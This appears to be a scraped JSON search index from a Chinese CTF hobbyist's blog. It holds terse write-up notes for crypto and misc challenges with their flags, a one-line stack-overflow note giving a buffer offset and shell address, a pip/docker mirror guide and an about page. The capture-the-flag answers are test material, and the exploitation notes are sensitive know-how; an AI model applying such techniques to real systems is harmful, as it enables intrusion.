juSTFoRfun没有太多的信息，就给了一串U2Fsd开头的字符串和题目名。直接拿去des，aes解密，并没有解出来。观察题目名，只有大小写。尝试转成ab的形式，拿去解密培根密码。得到HI。拿去des解密解出一串。观察这一串，发现只有个下划线相关，可能是ascii位移。写个脚本操作一下。解到其他写不到文件的就不行了。然后拿到看起来比较像的一串拿去栅栏得到flag 滴滴答答的凯撒得到一个文本，先把换行转成空格，再把16进制转成ascii码。在morse解密，在栅栏得到flag。主要是观察一下。一共就三种形式2e 2d 20 你认识这个校徽吗 题目给了word和一个txt。txt名为base64，内容解密后为Unit。word里图片最后有个图片。拖到010editor里看IEND尾后还有一串奇怪的字符。且word里内容涉及到凯撒密码和维吉尼亚密码。维吉尼亚解密即可获得flag 5space-rosb 题目给了个py，py里有5个变量，n，e1，e2，c1，c2。直接上共模攻击的脚本 HelloAndroid 把apk文件拖到_onkey-decompile-apk.bat上，自动反编译。或者用jadx打开 最简单的栈溢出计算buf到r的位置为8c,又知道bash的地址为0x0804854d，直接就可以写脚本get shell了 "},{"title":"buuctf-misc系列1(1-16)","date":"2021-02-15T07:03:00.000Z","url":"/2021/02/15/buuctf-misc%E7%B3%BB%E5%88%971(1-16)/","tags":[["misc","/tags/misc/"],["buuctf-misc","/tags/buuctf-misc/"],["buuctf","/tags/buuctf/"]],"categories":[["undefined",""]],"content":"比较简单的misc就做个系列 签到 金三胖 二维码 N种解决方法 大白 你竟然赶我走 基础破解 乌镇峰会种图 LSB 文件中的秘密 wireshark rar zip伪加密 qr 被嗅探的流量 镜子里面的世界 签到直接给出来了，提交就行了 flag&#123;buu_ctf&#125; 金三胖 给了一个gif，三种方法可解。21，51，79帧处有字符，拼接得到flag stegsolve的frame browser 爱奇艺万能播放器一帧一帧看 ffmpeg -i aaa.gif img_%d.jpg flag&#123;he11ohongke&#125; 二维码得到一个二维码，扫码发现不是flag。binwalk分离发现一个zip，zip里文件名提示4位数字爆破得到7639 flag&#123;vipw_wnoei&#125; N种方法解决查壳发现不是真的exe，010editor打开发现是base64，查看前面有经典的data:image/jpg;base64。直接找个在线网站转码。QR_code解码 flag&#123;dca57f966e4e4e31fd5b15417da63269&#125; 大白010直接改高度，拖入画图直接查看 crc宽高爆破脚本的方法 你竟然赶我走无其他信息，010打开在最后找到flag 基础破解arpr破解。解密出来之后base64 乌镇峰会种图文件尾找到flag LSB lsb最低位，rgb每个最低位看到png的头保存扫码cumtctf{1sb_i4_s0_Ea4y} 文件中的秘密 文件详情直接查看到flag wireshark 根据描述，直接使用过滤。密码就是flag rar 直接破解密码，8795得到密码 zip伪加密 ZipCenOp直接恢复伪加密文件 自己010里修改50 4b 03 04后第5位 qr 直接扫码有flag 被嗅探的流量 简介有文件传输，过滤个post看看。导出其中的一个包。在最后看到flag 镜子里面的世界文件最低位，rgb看到最上面有小点点 "},{"title":"pip源&docker源","date":"2021-02-15T02:12:00.000Z","url":"/2021/02/15/pip%E6%BA%90-docker%E6%BA%90/","tags":[["pip源&docker源","/tags/pip%E6%BA%90-docker%E6%BA%90/"]],"categories":[["undefined",""]],"content":"windows下永久配置pip源进入C:\\Users\\Administrator新建pip文件夹，新建pip.ini文件pip.ini文件内容 列出配置文件查看是否生效 linux下永久配置pip源cd ~进入用户家目录，mkdir -p .pip创建.php文件夹,vim pip.confpip.conf文件内容 windows，linux下pip临时更改源 linux下配置docker源 拉取镜像的时候很慢，就配了个国内的docker镜像加速,vim /etc/docker/daemon.json "},{"title":"关于我","date":"2021-02-11T02:13:00.000Z","url":"/2021/02/11/hello-world/","tags":[["关于我","/tags/%E5%85%B3%E4%BA%8E%E6%88%91/"]],"categories":[["undefined",""]],"content":"欢迎来到我的小窝，某不知名的弟弟。ctf小手子，主打misc和crypto。其余类型随缘做做。挖洞小菜罢了，目前还是一张上交证书。 关于这个博客，之前自己都是用印象笔记记笔记。也没有开别的博客分享啥的，现在就做开这个博客做记录了。用于记录平时的学习和当作一个笔记的作用吧 博客采用Hexo搭建 主题是Candinya的 Kratos-Rebirth"}]